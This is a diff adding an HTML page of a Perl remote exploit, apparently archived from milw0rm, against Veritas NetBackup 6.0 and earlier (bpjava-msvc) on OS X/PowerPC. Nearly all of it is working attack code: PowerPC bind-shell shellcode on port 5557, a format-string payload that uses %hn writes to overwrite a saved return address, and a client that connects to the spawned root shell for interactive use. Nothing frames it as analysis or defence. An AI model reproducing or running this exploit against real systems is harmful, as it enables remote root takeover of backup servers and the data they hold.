@@ -1,0 +1,154 @@
+<html>
+<head>
+<title>Veritas NetBackup <= 6.0 (bpjava-msvc) Remote Exploit (OS X)</title>
+<pre>
+#!/usr/bin/perl
+# VERITAS-OSX.pl - VERITAS NetBackup Format Strings OSX/ppc Remote Exploit
+# johnh[at]digitalmunition[dot]com
+# bug found by kf_lists[at]digitalmunition[dot]com
+# http://www.digitalmunition.com/
+use POSIX;
+use IO::Socket;
+use IO::Select;
+
+my $shellcode =   # /* OSX BINDSHELLCODE PORT=5557 NO-0x0 */
+&quot;\x60\x60\x60\x60&quot; x 10 . 
+&quot;\x7c\x63\x1a\x79\x40\x82\xff\xfd\x7d\xa8\x02\xa6\x38\xc3\xe1\x1d&quot;.
+&quot;\x39\x80\x01\x18\x39\xad\x1f\xff\x81\xcd\xe1\x21\x81\xed\xe1\x1d&quot;.
+&quot;\x7d\xef\x72\x78\x91\xed\xe1\x1d\x7c\x06\x68\xac\x7c\x01\x04\xac&quot;.
+&quot;\x7c\x06\x6f\xac\x4c\x01\x01\x2c\x39\xad\xff\xfc\x39\x8c\xff\xfb&quot;.
+&quot;\x7d\x8c\x63\x79\x40\x82\xff\xd8\x94\x81\x7d\x7d\x94\x61\x7d\x7e&quot;.
+&quot;\x94\x41\x7d\x79\x94\xe1\x7d\x1e\xe8\xe1\x7d\x7d\xd0\xe1\x7f\x07&quot;.
+&quot;\xd0\x9f\x66\x07\xe4\xe1\x7d\x72\xac\xe3\x68\xca\xac\xe1\x7d\x7f&quot;.
+&quot;\xd0\x69\x7f\xd9\x94\x41\x7d\x6f\x94\xe1\x7d\x17\xd3\x22\x8e\x07&quot;.
+&quot;\xe8\xe1\x7d\x7d\xd0\xe1\x7f\x07\x94\xe1\x7d\x15\xd3\x22\x8e\x07&quot;.
+&quot;\xe8\xe1\x7d\x7d\xd0\xe1\x7f\x07\xd3\x22\x8e\x07\x94\xe1\x7d\x61&quot;.
+&quot;\x94\x61\x7d\x6f\x3c\x60\x82\x97\x94\x40\x82\x97\x94\x60\x82\x8f&quot;.
+&quot;\xe8\xe1\x7d\x7d\xd0\xe1\x7f\x07\xd0\x9f\x66\x07\x94\x41\x7d\x7d&quot;.
+&quot;\x94\xe1\x7d\x25\xd3\x22\x8e\x07\xd0\x45\x56\x07\xe8\xe1\x7d\x7d&quot;.
+&quot;\xd0\xe1\x7f\x07\x94\x44\x82\x80\x80\xe4\x82\x80\xec\x63\x82\x9a&quot;.
+&quot;\x94\xe1\x7d\x3d\xe8\xe1\x7d\x7d\xd0\xe1\x7f\x07\xd0\x44\x57\x06&quot;.
+&quot;\xec\x63\x82\x82\xd0\x89\x7f\xd9\x94\x82\x7d\x57\x3c\x80\x82\x87&quot;.
+&quot;\x3c\x40\x82\x83\x94\x60\x82\x87\x94\xe1\x7d\x44\xd0\xe1\x79\xd3&quot;.
+&quot;\xe8\xe1\x7d\x7d\xd0\xe1\x7f\x07\xd3\x01\x7d\x77\x83\x83\x14\x11&quot;.
+&quot;\x83\x82\x0e\x17\xac\xe1\x7d\x7f\xac\xe1\x7d\x7f&quot;;
+
+my $host = shift || '192.168.1.111';
+my $port = shift || 13722;
+my $sock = new IO::Socket::INET(
+                  PeerAddr =&gt; $host,
+                  PeerPort =&gt; $port,
+                  Proto    =&gt; 'tcp');
+$sock or die &quot;no socket :$!&quot;;
+
+print $sock &quot; 118      1\n&quot; .
+# &quot;a&quot; x 150 . &quot;\n&quot;;
+$shellcode . &quot;\n&quot;;
+
+
+print scalar &lt;$sock&gt;;
+print scalar &lt;$sock&gt;;
+
+#sleep 10;
+
+print $sock &quot; 101      6\n&quot; . 
+
+# my $ret = 0xbffe5738; # Saved return from frame 1 vsprintf
+# write to 0xbffe5738+2 FIRST then write to 0xbffe5738. 
+# this allows the wrap past 0xffff to occur so we can form 0010
+&quot;\xbf\xfe\x57\x3a&quot; . &quot;ZZZZ&quot; . &quot;\xbf\xfe\x57\x38&quot;  . &quot;%x&quot; x 14 . 
+
+# shellcode is around 0x001009e8
+
+# &quot;%2474x&quot;    # 0x09e8
+&quot;%2280x&quot;    # 0x0920?
+. &quot;%hn&quot; . 
+&quot;%63212x.&quot;  # form 0x0010 by wrapping past 0xffff
+. &quot;%hn&quot;. 
+&quot;\n&quot; .
+
+&quot;A&quot; x 50 . &quot;\n&quot; .
+&quot;B&quot; x 50 . &quot;\n&quot; . 
+&quot;C&quot; x 50 . &quot;\n&quot; . 
+# &quot;D&quot; x 50 . &quot;\n&quot; .  # shellcode alternate location?
+$shellcode . &quot;\n&quot; .  
+&quot;E&quot; x 50 . &quot;\r\n&quot;;
+
+print scalar &lt;$sock&gt;;
+
+close $sock;
+
+
+my $shellport = 5557;
+print &quot;[*] Connect to remote shell port\n&quot;;
+my $sock = IO::Socket::INET-&gt;new (
+                Proto =&gt; &quot;tcp&quot;,
+                PeerAddr =&gt; $host,
+                PeerPort =&gt; $shellport,
+                Type =&gt; SOCK_STREAM
+);
+
+if (! $sock)
+{
+        print &quot;[*] Error, Seems Failed\n&quot;;
+        exit (0);
+}
+print &quot;[*] G0t R00T\n&quot;;
+StartShell ($sock);
+sub StartShell
+{
+        my ($client) = @_;
+        my $sel = IO::Select-&gt;new();
+
+
+        # unbuffered fun.
+
+
+        Unblock(*STDIN);
+        Unblock(*STDOUT);
+        Unblock($client);
+
+        select($client); $|++;
+        select(STDIN);   $|++;
+        select(STDOUT);  $|++;
+
+        $sel-&gt;add($client);
+        $sel-&gt;add(*STDIN);
+
+        while (fileno($client))
+        {
+                my $fd;
+                my @fds = $sel-&gt;can_read(1);
+		foreach $fd (@fds)
+                {
+                        my $in = &lt;$fd&gt;;
+                        if (! $in || ! $fd || ! $client)
+                        {
+                                print &quot;[*] Closing connection.\n&quot;;
+                                close($client);
+                                exit(0);
+                        }
+
+                        if ($fd eq $client)
+                        {
+                                print STDOUT $in;
+                                } else {
+                                        print $client $in;
+                                }
+                        }
+                }
+                close ($client);
+  exit (0);
+}
+
+sub Unblock {
+        my $fd = shift;
+        my $flags;
+        $flags = fcntl($fd,F_GETFL,0) || die &quot;Can't get flags for file handle: $!\n&quot;;
+        fcntl($fd, F_SETFL, $flags|O_NONBLOCK) || die &quot;Can't make handle nonblocking: $!\n&quot;;
+}
+
+# milw0rm.com [2005-10-20]
+</pre>
+</html>
+
